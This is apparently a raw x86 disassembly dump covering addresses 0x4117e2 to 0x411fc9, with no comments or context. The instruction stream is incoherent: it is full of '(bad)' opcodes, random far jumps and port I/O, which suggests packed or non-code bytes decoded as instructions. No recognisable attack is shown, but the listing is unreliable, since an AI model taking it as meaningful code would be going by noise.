  4117e2:	(bad)  
  4117e3:	xor    DWORD PTR [eax-0x71],edx
  4117e6:	ficomp WORD PTR [ebx]
  4117e8:	lods   al,BYTE PTR ds:[esi]
  4117e9:	mov    edi,0x28d61c1c
  4117ee:	mov    dl,0xbe
  4117f0:	sbb    al,0x3
  4117f2:	mov    esp,0x2821f835
  4117f7:	mov    ah,0xc9
  4117f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4117fa:	mov    bl,0x6f
  4117fc:	es popa 
  4117fe:	mov    ch,0x4b
  411800:	pop    ds
  411801:	call   0xb22a:0x5af4486d
  411808:	(bad)  
  41180a:	les    eax,FWORD PTR [esp+edi*8]
  41180d:	aad    0xf1
  41180f:	dec    esp
  411810:	dec    esi
  411811:	dec    ebp
  411812:	test   bh,bl
  411814:	jno    0x411816
  411816:	ss xor dl,dl
  411819:	ds pop edx
  41181b:	ror    cl,1
  41181d:	and    bh,dl
  41181f:	or     al,0xa0
  411821:	shl    eax,1
  411823:	mov    edx,0xe090d544
  411828:	stc    
  411829:	mov    dh,0xd3
  41182b:	not    BYTE PTR [eax+0x62]
  41182e:	fsub   QWORD PTR [esi+0x4702502b]
  411834:	test   BYTE PTR [ebx-0x1e6cab83],cl
  41183a:	push   esp
  41183b:	test   DWORD PTR [edi],edx
  41183d:	cli    
  41183e:	(bad)  [ecx-0x8f41edb]
  411844:	mov    ebx,es
  411846:	xchg   ebp,eax
  411847:	rcl    DWORD PTR [ebx],1
  411849:	mov    ds:0x5541493d,eax
  41184e:	fwait
  41184f:	daa    
  411850:	or     eax,edx
  411852:	push   cs
  411853:	sub    edx,DWORD PTR [ebp+0x8]
  411856:	inc    ebp
  411857:	mov    ds:0x2629029e,al
  41185c:	lock aas 
  41185e:	xchg   ebp,eax
  41185f:	jecxz  0x4118d0
  411861:	imul   eax,ebp,0xffffffea
  411864:	rcr    BYTE PTR [ebx],0x38
  411867:	cmp    al,0x3b
  411869:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41186a:	clc    
  41186b:	pop    es
  41186c:	cmp    al,0x45
  41186e:	pop    ebp
  41186f:	sti    
  411870:	ret    0x3db1
  411873:	xchg   DWORD PTR [eax+0x72ba6092],ebp
  411879:	push   esi
  41187a:	sbb    DWORD PTR [eax-0x7815f741],0x2cb2aa2b
  411884:	jmp    0x41187f
  411886:	push   esi
  411887:	inc    ebp
  411888:	gs xchg ebx,eax
  41188a:	jl     0x4118bd
  41188c:	mov    edi,0x3b4d10c2
  411891:	xchg   edi,eax
  411892:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411893:	mov    dl,0x4
  411895:	sbb    ebx,esi
  411897:	sub    al,0x57
  411899:	mov    ch,0x7b
  41189b:	jmp    0x23a0:0x2ea74184
  4118a2:	mov    bh,0xaa
  4118a4:	jo     0x41184a
  4118a6:	ja     0x4118c6
  4118a8:	mov    eax,0xbf128cb5
  4118ad:	push   DWORD PTR ds:0xfca6d439
  4118b3:	mov    ebx,0x6f744d75
  4118b8:	inc    ecx
  4118b9:	inc    eax
  4118ba:	or     bh,BYTE PTR [ecx-0x420881f6]
  4118c0:	sbb    ah,0x32
  4118c3:	mov    ebx,0xbd7109f7
  4118c8:	test   DWORD PTR [ebx],ebx
  4118ca:	lahf   
  4118cb:	(bad)  
  4118cc:	gs mov esi,0x8a7dc1cc
  4118d2:	adc    esp,DWORD PTR ss:[ebp-0x3f12ba09]
  4118d9:	push   ecx
  4118da:	xor    DWORD PTR ds:0xe6052a14,0x75d2f076
  4118e4:	shl    BYTE PTR ds:0xd136a674,0xc
  4118eb:	add    ebx,ecx
  4118ed:	mov    ch,0x97
  4118ef:	add    ebx,DWORD PTR [esp+ecx*2]
  4118f2:	sti    
  4118f3:	push   cs
  4118f4:	sbb    DWORD PTR [edx],eax
  4118f6:	add    ah,al
  4118f8:	popa   
  4118f9:	mov    ss,eax
  4118fb:	imul   esi,DWORD PTR [eax],0x2fd3948b
  411901:	xchg   bp,ax
  411903:	pop    ds
  411904:	ja     0x411900
  411906:	(bad)  [esi-0x1f]
  411909:	repnz imul edi,DWORD PTR [ecx-0x1cc6c324],0x77
  411911:	or     cl,BYTE PTR [eax-0x35]
  411914:	pop    ebx
  411915:	jmp    0x4ce:0x4aa5adde
  41191c:	lods   eax,DWORD PTR ds:[esi]
  41191d:	cwde   
  41191e:	inc    BYTE PTR [ecx]
  411920:	push   ds
  411921:	jmp    0x41192d
  411923:	inc    esp
  411924:	lea    esi,[esi]
  411926:	adc    BYTE PTR [ecx],0x3e
  411929:	push   edi
  41192a:	dec    esi
  41192b:	out    0x43,eax
  41192d:	lock (bad) 
  41192f:	popa   
  411930:	xchg   ebx,eax
  411931:	mov    esp,0x33fefe5b
  411936:	jmp    0x419ded5d
  41193b:	mov    al,ds:0xba014f06
  411940:	mov    cl,0x92
  411942:	jl     0x4118dd
  411944:	mov    eax,?
  411946:	fwait
  411947:	(bad)  
  411948:	cmc    
  411949:	fcmovbe st,st(4)
  41194b:	cmp    al,0x89
  41194d:	pslld  mm7,QWORD PTR [esi]
  411950:	cmp    DWORD PTR [ebx+0x6e],0x76
  411954:	xchg   edx,eax
  411955:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411956:	ret    
  411957:	cmp    ebp,esi
  411959:	addr16 jmp 0xfa6f9e2e
  41195f:	frstor [ebp-0x10]
  411962:	mov    ch,0x1d
  411964:	push   ebx
  411965:	push   es
  411966:	mov    cl,0x88
  411968:	out    dx,eax
  411969:	jmp    0x41197e
  41196b:	sbb    esi,eax
  41196d:	push   es
  41196e:	jle    0x4119ae
  411970:	sbb    bh,BYTE PTR [edi-0x79]
  411973:	dec    edx
  411974:	push   cs
  411975:	sub    eax,0x157500b9
  41197a:	ins    BYTE PTR es:[edi],dx
  41197b:	push   edx
  41197c:	xchg   edi,eax
  41197d:	mov    dh,BYTE PTR [edx+0x5ea8fc1e]
  411983:	fs dec edx
  411985:	ss fucomi st,st(5)
  411988:	sar    DWORD PTR [ebp-0x62],1
  41198b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41198c:	sub    BYTE PTR [esp+esi*8+0x6e],al
  411990:	adc    BYTE PTR [ebx+0xa],ch
  411993:	sub    esi,ebp
  411995:	add    eax,0x9e0aa020
  41199a:	int    0xb4
  41199c:	daa    
  41199d:	adc    DWORD PTR [edx+0x16],ebx
  4119a0:	repnz aaa 
  4119a2:	jle    0x4119fa
  4119a4:	in     eax,dx
  4119a5:	stos   DWORD PTR es:[edi],eax
  4119a6:	or     eax,0xf4efe4fa
  4119ab:	pop    ds
  4119ac:	and    al,0x51
  4119ae:	cmp    al,0xf8
  4119b0:	lar    esp,si
  4119b3:	sbb    ch,BYTE PTR [ecx-0x20]
  4119b6:	mov    gs,WORD PTR [edx+0x3d]
  4119b9:	jecxz  0x4119ff
  4119bb:	hlt    
  4119bc:	stos   BYTE PTR es:[edi],al
  4119bd:	mov    ebp,0xa8449136
  4119c2:	inc    edx
  4119c3:	jmp    0x1edc:0x19c2ff3d
  4119ca:	les    esi,FWORD PTR [ebx-0x24]
  4119cd:	scas   eax,DWORD PTR es:[edi]
  4119ce:	and    eax,0xfea4f104
  4119d3:	data16 in al,dx
  4119d5:	mov    esp,0xac93eb4e
  4119da:	rcr    BYTE PTR [ebx-0x6d],cl
  4119dd:	cwde   
  4119de:	rcr    ebp,cl
  4119e0:	(bad)  
  4119e1:	int    0x44
  4119e3:	popa   
  4119e4:	cmp    eax,0x14183b46
  4119e9:	repnz outs dx,DWORD PTR ds:[esi]
  4119eb:	push   esp
  4119ec:	push   ebp
  4119ed:	jle    0x4119bf
  4119ef:	hlt    
  4119f0:	or     BYTE PTR [edi-0x236d5e3a],bh
  4119f6:	aaa    
  4119f7:	outs   dx,BYTE PTR ds:[esi]
  4119f8:	mov    ds:0xcf4bece2,al
  4119fd:	xor    edx,DWORD PTR [eax+0xe7199fa]
  411a03:	icebp  
  411a04:	xor    eax,0xf63d8d5c
  411a09:	aad    0xd7
  411a0b:	adc    ah,al
  411a0d:	ins    BYTE PTR es:[edi],dx
  411a0e:	or     cl,BYTE PTR [eax*1-0x2ac9541a]
  411a15:	mov    bl,0x4b
  411a17:	nop
  411a18:	mov    esi,0xd80d3b0f
  411a1d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411a1e:	jmp    0x4119c0
  411a20:	sbb    ebx,ebx
  411a22:	jge    0x411a80
  411a24:	pop    es
  411a25:	xor    BYTE PTR [esi+0x1a59c5cf],ah
  411a2b:	adc    al,0x12
  411a2d:	pushf  
  411a2e:	fsubr  DWORD PTR [edi]
  411a30:	repz (bad) 
  411a32:	imul   esi,DWORD PTR [edi],0x7
  411a35:	sbb    BYTE PTR [edx+0x53],ah
  411a38:	mov    ch,ah
  411a3a:	leave  
  411a3b:	cmp    al,0xd1
  411a3d:	or     DWORD PTR [esi],ebp
  411a3f:	loopne 0x411a37
  411a41:	stos   BYTE PTR es:[edi],al
  411a42:	out    0x34,al
  411a44:	in     al,0xdc
  411a46:	test   BYTE PTR [ebx],cl
  411a48:	pushf  
  411a49:	mov    WORD PTR [esp+ecx*8+0x55],fs
  411a4d:	daa    
  411a4e:	xor    DWORD PTR [ecx-0x34],0x5599573e
  411a55:	iret   
  411a56:	sub    eax,0x53ed9179
  411a5b:	ret    0x8bf
  411a5e:	in     eax,0x3a
  411a60:	call   0x9308ce2a
  411a65:	sbb    al,0x3d
  411a67:	mov    bl,BYTE PTR [esi+0x1ffbb8e2]
  411a6d:	addr16 push ecx
  411a6f:	rcr    BYTE PTR [ebx],cl
  411a71:	add    eax,0x20e8a0bf
  411a76:	daa    
  411a77:	sub    al,BYTE PTR [ecx-0x74]
  411a7a:	xor    eax,0x29543ba7
  411a7f:	imul   ebx,DWORD PTR [eax],0x32517577
  411a85:	mov    cl,al
  411a87:	fbstp  TBYTE PTR [edx+0x2892942a]
  411a8d:	cwde   
  411a8e:	call   0x4a6388a0
  411a93:	(bad)  
  411a95:	fnstcw WORD PTR [edi+eax*1]
  411a98:	xchg   DWORD PTR [ecx],esi
  411a9a:	(bad)  
  411a9b:	fdiv   st,st(6)
  411a9d:	pushf  
  411a9e:	xor    bl,ch
  411aa0:	(bad)  
  411aa1:	jmp    0x73e50484
  411aa6:	(bad)  
  411aa8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411aa9:	push   ebp
  411aaa:	xchg   ecx,eax
  411aab:	repnz xor cl,BYTE PTR [eax-0x16]
  411aaf:	jbe    0x411a82
  411ab1:	imul   edi,DWORD PTR [esi],0xa
  411ab4:	fldcw  WORD PTR [ebp-0x4c]
  411ab7:	ins    DWORD PTR es:[edi],dx
  411ab8:	nop
  411ab9:	fild   QWORD PTR [edx+0x717d7b95]
  411abf:	sbb    ecx,edi
  411ac1:	xor    eax,0xbc9d816c
  411ac6:	dec    esp
  411ac7:	xor    eax,0xdbc11862
  411acc:	lea    edx,[eax]
  411ace:	jae    0x411b32
  411ad0:	jge    0x411a6d
  411ad2:	inc    edi
  411ad3:	fld    st(3)
  411ad5:	daa    
  411ad6:	inc    eax
  411ad7:	cvttps2pi mm2,QWORD PTR [esi+0x73]
  411adb:	les    ebp,FWORD PTR [esi+0x36]
  411ade:	mov    dh,0xf8
  411ae0:	or     eax,0xc3d8dd70
  411ae5:	(bad)  
  411ae6:	jo     0x411b13
  411ae8:	enter  0xace,0x8b
  411aec:	icebp  
  411aed:	add    BYTE PTR [esi+0x2c681153],0xf
  411af4:	arpl   WORD PTR [ebp-0x7b564fa3],di
  411afa:	out    0x38,al
  411afc:	into   
  411afd:	push   ecx
  411afe:	cmp    DWORD PTR [edi-0x7688b848],edx
  411b04:	xor    al,0x4f
  411b06:	and    BYTE PTR [ebp+0x2daf9844],ah
  411b0c:	dec    ecx
  411b0d:	hlt    
  411b0e:	push   edi
  411b0f:	inc    ecx
  411b10:	in     eax,dx
  411b11:	sbb    BYTE PTR [ecx+0x33],cl
  411b14:	bound  esi,QWORD PTR [ecx+0xf2dfe19]
  411b1a:	icebp  
  411b1b:	ret    0x805b
  411b1e:	je     0x411b1c
  411b20:	jne    0x411b12
  411b22:	in     al,0xdc
  411b24:	or     BYTE PTR [edi+0x1431525],bl
  411b2a:	retf   0xbe48
  411b2d:	fcom   st(6)
  411b2f:	jl     0x411aee
  411b31:	pop    esp
  411b32:	aas    
  411b33:	call   0x468f:0x62d765d3
  411b3a:	aaa    
  411b3b:	push   0x38
  411b3d:	push   0x6c
  411b3f:	pusha  
  411b40:	pusha  
  411b41:	and    BYTE PTR [edi-0x5ab0304b],dl
  411b47:	add    al,dh
  411b49:	xchg   ebx,eax
  411b4a:	dec    ecx
  411b4b:	int    0x20
  411b4d:	and    al,0xc0
  411b4f:	mov    ah,0x86
  411b51:	dec    edx
  411b52:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411b53:	dec    ebp
  411b54:	mov    ebx,0xc3c228f4
  411b59:	push   0xffffffcc
  411b5b:	jge    0x411b15
  411b5d:	push   es
  411b5e:	std    
  411b5f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411b60:	sahf   
  411b61:	inc    eax
  411b62:	dec    edi
  411b63:	(bad)  
  411b64:	xor    edx,DWORD PTR [eax+0x36060fa5]
  411b6a:	lea    edi,[eax+0x78]
  411b6d:	fidiv  WORD PTR [edx+0x42a4633f]
  411b73:	fnstsw WORD PTR [esi+0x2b]
  411b76:	sub    BYTE PTR [esi],bl
  411b78:	out    0xb5,al
  411b7a:	cs or  eax,0xb7182fac
  411b80:	int3   
  411b81:	xchg   edx,eax
  411b82:	(bad)  
  411b84:	pop    ecx
  411b85:	xchg   esp,eax
  411b86:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411b87:	mov    ecx,0xdca300f4
  411b8c:	dec    esp
  411b8d:	xor    BYTE PTR [edi+0x31],ch
  411b90:	adc    eax,0xad6d0850
  411b95:	iret   
  411b96:	cdq    
  411b97:	and    eax,0xe8b7d71c
  411b9c:	ja     0x411b5b
  411b9e:	add    cl,BYTE PTR [esi-0x2835f646]
  411ba4:	loopne 0x411b32
  411ba6:	add    dh,BYTE PTR [eax]
  411ba8:	sbb    ch,BYTE PTR [eax+0x266f1156]
  411bae:	mov    BYTE PTR [edx],dl
  411bb0:	cdq    
  411bb1:	xor    BYTE PTR [esi+edi*8],al
  411bb4:	in     al,0xd9
  411bb6:	or     eax,0x97840988
  411bbb:	xchg   edx,eax
  411bbc:	push   0x15
  411bbe:	dec    esp
  411bbf:	inc    esp
  411bc0:	loopne 0x411be9
  411bc2:	jbe    0x411c2d
  411bc4:	pusha  
  411bc5:	cmp    BYTE PTR [ecx+ebp*8],0xbe
  411bc9:	stos   DWORD PTR es:[edi],eax
  411bca:	push   edi
  411bcb:	sbb    cl,ch
  411bcd:	mov    ds:0xcc345498,al
  411bd2:	or     ebx,DWORD PTR [ebx+ecx*1+0x6546082f]
  411bd9:	ins    DWORD PTR es:[edi],dx
  411bda:	jb     0x411b76
  411bdc:	add    eax,DWORD PTR ds:0x9c0851aa
  411be2:	or     ecx,ebx
  411be4:	imul   esi,ebx,0x4404e983
  411bea:	mov    ds:0xffb4b59d,al
  411bef:	(bad)  
  411bf0:	in     al,dx
  411bf1:	stos   BYTE PTR es:[edi],al
  411bf2:	push   edi
  411bf3:	add    ah,BYTE PTR [edi]
  411bf5:	stc    
  411bf6:	inc    esi
  411bf7:	clc    
  411bf8:	sub    DWORD PTR [edx+0x4f],ebp
  411bfb:	adc    al,0x34
  411bfd:	(bad)  
  411bff:	cmp    al,0x4b
  411c01:	lock je 0x411c15
  411c04:	scas   al,BYTE PTR es:[edi]
  411c05:	jg     0x411c0e
  411c07:	pop    edx
  411c08:	push   esp
  411c09:	(bad)  
  411c0a:	stos   DWORD PTR es:[edi],eax
  411c0b:	fdivr  DWORD PTR [ecx]
  411c0d:	sub    ebx,ebp
  411c0f:	add    BYTE PTR ds:0x207255ec,ch
  411c15:	and    cl,BYTE PTR [edx]
  411c17:	adc    al,bh
  411c19:	mov    ebx,0xdbcef507
  411c1e:	popf   
  411c1f:	rol    ecx,1
  411c21:	js     0x411bed
  411c23:	call   0xe178b4a
  411c28:	cwde   
  411c29:	adc    eax,0x45647729
  411c2e:	cmp    al,0xa0
  411c30:	je     0x411bce
  411c32:	sbb    BYTE PTR [ebx-0x7007883b],0x3c
  411c39:	or     dl,BYTE PTR [eax+esi*1-0x80]
  411c3d:	jae    0x411c05
  411c3f:	lods   al,BYTE PTR ds:[esi]
  411c40:	stos   BYTE PTR es:[edi],al
  411c41:	push   edi
  411c42:	imul   ecx,DWORD PTR [esi-0x4bc09af1],0x4
  411c49:	and    eax,edx
  411c4b:	cmp    al,0xb9
  411c4d:	adc    eax,0xca603689
  411c52:	scas   al,BYTE PTR es:[edi]
  411c53:	ss jge 0x411c7c
  411c56:	pop    edx
  411c57:	push   ss
  411c58:	popf   
  411c59:	jecxz  0x411c20
  411c5b:	and    al,0x2f
  411c5d:	cwde   
  411c5e:	xlat   BYTE PTR ds:[ebx]
  411c60:	pop    edi
  411c61:	enter  0xa22d,0x56
  411c65:	mov    edi,0xe85f4028
  411c6a:	loopne 0x411c51
  411c6c:	and    eax,0x3cb618df
  411c71:	jl     0x411c35
  411c73:	cmp    DWORD PTR [ebp-0x51],ebx
  411c76:	sbb    al,0xb
  411c78:	loope  0x411cbc
  411c7a:	cmp    al,0x3b
  411c7c:	push   ebp
  411c7d:	inc    ebp
  411c7e:	test   eax,0x85ac7681
  411c83:	sahf   
  411c84:	outs   dx,BYTE PTR ds:[esi]
  411c85:	mov    eax,0xacdc46a0
  411c8a:	jmp    0x411c17
  411c8c:	repz jns 0x411c8e
  411c8f:	mov    ecx,0xdb678097
  411c94:	(bad)  
  411c95:	push   ds
  411c96:	shr    DWORD PTR [ebx+ebp*8-0x21],0x6f
  411c9b:	sub    BYTE PTR [eax+0x2d],dh
  411c9e:	jae    0x411cb7
  411ca0:	lock call 0x7307d0d9
  411ca6:	fsub   st(4),st
  411ca8:	ror    DWORD PTR [edx-0x4e136c46],0x2c
  411caf:	mov    esi,0xac8bfa05
  411cb4:	call   0xf1d0cd00
  411cb9:	cwde   
  411cba:	and    al,0x56
  411cbc:	xchg   edx,eax
  411cbd:	lea    esp,[ecx-0x4ef366f6]
  411cc3:	test   BYTE PTR [edi-0x1b],0xc3
  411cc7:	ja     0x411d30
  411cc9:	pop    edi
  411cca:	fisubr WORD PTR [ecx+0x651aa718]
  411cd0:	mov    ebx,0x109afc33
  411cd5:	aam    0xb6
  411cd7:	outs   dx,DWORD PTR ds:[esi]
  411cd8:	sub    DWORD PTR [eax-0x6ad31cb9],0x50f4a374
  411ce2:	xor    eax,0x96f3e672
  411ce7:	fsincos 
  411ce9:	jnp    0x411cc3
  411ceb:	arpl   WORD PTR [ebx+0x6],ax
  411cee:	repz xor eax,DWORD PTR [edx]
  411cf1:	push   ss
  411cf2:	retf   0x49f6
  411cf5:	pop    ss
  411cf6:	jmp    0xb2387854
  411cfb:	ds mov esp,0x69ec3f9f
  411d01:	pop    esp
  411d02:	fdivr  QWORD PTR [edx+0x1a]
  411d05:	xor    BYTE PTR [ebx+0x1d39cf1a],bl
  411d0b:	mov    dl,0x72
  411d0d:	adc    DWORD PTR [edi+0xd],esi
  411d10:	pop    DWORD PTR cs:[ecx]
  411d13:	jmp    0xd135e7c5
  411d18:	sti    
  411d19:	test   al,0xc6
  411d1b:	mov    ch,0xd2
  411d1d:	sbb    al,0xc6
  411d1f:	mov    ch,0x85
  411d21:	and    eax,0x4645a956
  411d26:	shr    cl,1
  411d28:	mov    eax,ds:0x4e2a5ccc
  411d2d:	test   BYTE PTR [ebx+0x76],cl
  411d30:	in     al,dx
  411d31:	pop    esi
  411d32:	repnz xchg ecx,eax
  411d34:	cs push edi
  411d36:	lds    edi,FWORD PTR [eax+0x703491ed]
  411d3c:	test   eax,0x85df74fd
  411d41:	int3   
  411d42:	sbb    DWORD PTR [edi+0x5eae2163],eax
  411d48:	sahf   
  411d49:	jmp    0x36ed:0xf9206b3c
  411d50:	sub    BYTE PTR [edx+0x3],ah
  411d53:	cmp    ah,BYTE PTR [esi-0x4c]
  411d56:	inc    esi
  411d57:	call   0x8d4c14c3
  411d5c:	add    dl,BYTE PTR [edx]
  411d5e:	cmp    BYTE PTR [eax+0x70],ah
  411d61:	mov    edx,0xa7f03710
  411d66:	out    0x9b,eax
  411d68:	repz mov edi,DWORD PTR [edx-0x58]
  411d6c:	int    0x64
  411d6e:	or     cl,bh
  411d70:	jno    0x411d9b
  411d72:	and    esp,DWORD PTR [edx]
  411d74:	arpl   WORD PTR [eax],sp
  411d76:	cld    
  411d77:	(bad)  
  411d78:	adc    ah,bh
  411d7a:	stc    
  411d7b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411d7c:	dec    ecx
  411d7d:	pop    ebx
  411d7e:	xchg   edx,eax
  411d7f:	mov    ah,0xc8
  411d81:	and    DWORD PTR [edi],edx
  411d83:	retf   0x8eb2
  411d86:	push   cs
  411d87:	out    0xd4,al
  411d89:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411d8a:	mov    ebx,0xbdd64ca5
  411d8f:	fstp   DWORD PTR [ecx-0x6f]
  411d92:	dec    esi
  411d93:	sbb    DWORD PTR [ebx-0x76],esp
  411d96:	imul   eax,DWORD PTR ds:0x7ed5b621,0x6c
  411d9d:	adc    edx,DWORD PTR [edi+0x5b]
  411da0:	mov    ebx,0x68e1c162
  411da5:	pop    esp
  411da6:	adc    eax,0xe3b3cd73
  411dab:	xchg   ebx,eax
  411dac:	test   BYTE PTR [edx-0x14ada79b],0x1
  411db3:	je     0x411dfd
  411db5:	pop    ss
  411db6:	pop    esp
  411db7:	cmc    
  411db8:	xor    BYTE PTR [edx+0x6b],cl
  411dbb:	adc    DWORD PTR [edi-0x6085ea88],esp
  411dc1:	jmp    0x411d8e
  411dc3:	mov    dl,0xba
  411dc6:	adc    ecx,DWORD PTR [edx+0x31]
  411dc9:	(bad)  
  411dca:	fldcw  WORD PTR [ebp-0x13]
  411dcd:	(bad)  
  411dce:	pop    ds
  411dcf:	outs   dx,DWORD PTR ds:[esi]
  411dd0:	pop    esi
  411dd1:	loope  0x411d5b
  411dd3:	push   ds
  411dd4:	xchg   ecx,eax
  411dd5:	mov    edi,0xf53b7f2e
  411dda:	test   al,0x96
  411ddc:	rcl    DWORD PTR [ebx],1
  411dde:	in     eax,0x31
  411de0:	dec    eax
  411de1:	pop    edi
  411de2:	nop
  411de3:	(bad)  
  411de4:	jno    0x411d8f
  411de6:	inc    ecx
  411de7:	sti    
  411de8:	mov    esi,0xdb480fca
  411ded:	ret    
  411dee:	jbe    0x411d70
  411df0:	mov    edx,0xef4b3a5a
  411df5:	xchg   esp,eax
  411df6:	fisttp QWORD PTR [esi]
  411df8:	lock mov ch,BYTE PTR [ebp+0x22]
  411dfc:	inc    eax
  411dfd:	xchg   edx,eax
  411dfe:	sub    DWORD PTR [ebx+ebx*4-0x393f8ca7],edi
  411e05:	and    eax,0x7eaaec95
  411e0a:	inc    ebp
  411e0b:	or     eax,0xe8b2535
  411e10:	push   ebp
  411e11:	jmp    0x439e225
  411e16:	bound  esi,QWORD PTR [edi]
  411e18:	les    eax,FWORD PTR [ecx+0x82da7ff]
  411e1e:	fsubr  st(6),st
  411e20:	push   es
  411e21:	jmp    0x1b32:0x64c8682
  411e28:	fcomp  QWORD PTR [ecx+0x63]
  411e2b:	mov    ebp,0xefbe5b6b
  411e30:	add    edx,DWORD PTR [ebp+0x3c]
  411e33:	stos   BYTE PTR es:[edi],al
  411e34:	shl    DWORD PTR [eax],0x7d
  411e37:	xor    al,0x86
  411e39:	lahf   
  411e3a:	test   BYTE PTR [esi],ah
  411e3c:	xchg   BYTE PTR [ecx+ebx*2-0x164c24f7],dh
  411e43:	les    ebp,FWORD PTR [ebp-0x44]
  411e46:	xchg   edi,eax
  411e47:	lods   eax,DWORD PTR ds:[esi]
  411e48:	imul   ecx,DWORD PTR [ecx+ebx*8+0x1c],0xffffffae
  411e4d:	repz cmp dh,BYTE PTR [esi]
  411e50:	lods   al,BYTE PTR ds:[esi]
  411e51:	into   
  411e52:	sub    ah,cl
  411e54:	lods   eax,DWORD PTR ds:[esi]
  411e55:	sahf   
  411e56:	pop    es
  411e57:	cmc    
  411e58:	scas   al,BYTE PTR es:[edi]
  411e59:	xor    bl,BYTE PTR [edx]
  411e5b:	and    eax,0x48b11249
  411e60:	add    eax,0x5ba237f3
  411e65:	sub    ebx,DWORD PTR [edi-0x25b843ff]
  411e6b:	push   0x35
  411e6d:	jle    0x411e2a
  411e6f:	aam    0x21
  411e71:	mov    edx,0x8768c1da
  411e76:	loop   0x411ebe
  411e78:	jns    0x411ee5
  411e7a:	(bad)  
  411e7c:	icebp  
  411e7d:	stos   DWORD PTR es:[edi],eax
  411e7e:	push   DWORD PTR [eax]
  411e80:	out    dx,al
  411e81:	pop    edi
  411e82:	lahf   
  411e83:	test   eax,0x8664937e
  411e88:	div    DWORD PTR [ebp+ebx*1+0x14]
  411e8c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411e8d:	fstp   DWORD PTR [esi+ecx*4-0x16bcb957]
  411e94:	stos   BYTE PTR es:[edi],al
  411e95:	mov    ebp,0x4d5676f2
  411e9a:	inc    edi
  411e9b:	push   0x71
  411e9d:	pop    edx
  411e9e:	cdq    
  411e9f:	shl    DWORD PTR [ebx+ecx*1+0x43e8c113],0x4b
  411ea7:	push   ebx
  411ea8:	ror    DWORD PTR [esi-0x3e],1
  411eab:	mov    al,ds:0xa0e5a9a3
  411eb0:	mov    esp,0xcb13270c
  411eb5:	fs cs pop eax
  411eb8:	dec    esp
  411eb9:	mov    ds:0x40a96781,al
  411ebe:	test   eax,0x107e96a3
  411ec3:	cmp    al,0xc
  411ec5:	mov    edi,0x1079799b
  411eca:	mov    WORD PTR [edi],ss
  411ecc:	(bad)  
  411ecd:	fcmovnbe st,st(6)
  411ecf:	int    0xc8
  411ed1:	popa   
  411ed2:	repnz mov ch,0x3e
  411ed5:	aam    0xca
  411ed7:	add    ebx,DWORD PTR [ebx+0x5a63c2a]
  411edd:	adc    al,0xc0
  411edf:	imul   ebx,DWORD PTR [esi+ecx*1+0x3c08ce38],0x854eecdc
  411eea:	aas    
  411eeb:	fld    QWORD PTR ds:0xafa7a8ed
  411ef1:	dec    ecx
  411ef2:	cmp    BYTE PTR [ecx+0x24c6fd69],dh
  411ef8:	test   BYTE PTR [ecx-0x62],cl
  411efb:	stc    
  411efc:	iret   
  411efd:	ret    0x9ac
  411f00:	ds mov dh,0x29
  411f03:	cli    
  411f04:	aas    
  411f05:	sbb    eax,0xb5cced51
  411f0a:	or     eax,0xe887120c
  411f0f:	push   eax
  411f10:	outs   dx,DWORD PTR ds:[esi]
  411f11:	test   eax,0x70b470c2
  411f16:	pop    es
  411f17:	sti    
  411f18:	call   DWORD PTR [edi+ecx*2+0x69ada2c7]
  411f1f:	test   ebx,eax
  411f21:	mov    esi,0x38bc2581
  411f26:	into   
  411f27:	add    edi,DWORD PTR [edx-0x2f]
  411f2a:	sub    edx,edi
  411f2c:	mov    ebx,edi
  411f2e:	ins    DWORD PTR es:[edi],dx
  411f2f:	imul   ebx,DWORD PTR ds:0x8c3adeed,0xdf679641
  411f39:	add    eax,0x7e2b0c2f
  411f3e:	loop   0x411f1c
  411f40:	adc    BYTE PTR [eax+0x6377a0c8],cl
  411f46:	aaa    
  411f47:	jp     0x411f12
  411f49:	pop    ecx
  411f4a:	fst    QWORD PTR [edi+eax*8+0x30]
  411f4e:	sub    ah,cl
  411f50:	add    BYTE PTR [ebx+0x52],dl
  411f53:	data16 je 0x411f43
  411f56:	and    BYTE PTR [eax-0x6510c8ab],cl
  411f5c:	push   esp
  411f5d:	dec    eax
  411f5e:	sti    
  411f5f:	mov    bh,0xc
  411f61:	int3   
  411f62:	xlat   BYTE PTR ds:[ebx]
  411f63:	inc    ecx
  411f64:	push   edi
  411f65:	xchg   edi,eax
  411f66:	xchg   DWORD PTR ds:0x7ee8fd0f,esi
  411f6c:	rcr    ebx,0xb7
  411f6f:	mov    edx,0x35380e8f
  411f74:	outs   dx,BYTE PTR ds:[esi]
  411f75:	ins    BYTE PTR es:[edi],dx
  411f76:	jae    0x411f61
  411f78:	dec    esp
  411f79:	push   0xffffffe1
  411f7b:	jmp    0x411fc1
  411f7d:	jmp    0x7ec6:0xe45cbb27
  411f84:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411f85:	rol    BYTE PTR ds:0xf52fedfd,1
  411f8b:	rcr    DWORD PTR [ebp-0x43214241],1
  411f91:	cmp    eax,0x9911db62
  411f96:	sbb    DWORD PTR ds:0xbfb184fd,edx
  411f9c:	and    al,0x5
  411f9e:	jbe    0x411f4b
  411fa0:	repnz pop es
  411fa2:	add    al,0x36
  411fa4:	pop    ds
  411fa5:	xchg   ebp,eax
  411fa6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411fa7:	lods   eax,DWORD PTR ds:[esi]
  411fa8:	fstp   DWORD PTR [eax+0x197dd35a]
  411fae:	jno    0x41200c
  411fb0:	and    al,0xc3
  411fb2:	mov    al,ds:0x2a7b38e0
  411fb7:	mov    ah,cl
  411fb9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411fba:	push   ss
  411fbb:	dec    eax
  411fbc:	mov    ebp,0x8bf59901
  411fc1:	adc    DWORD PTR [eax],ebx
  411fc3:	cs mov ebp,0x4e2fca7d
  411fc9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
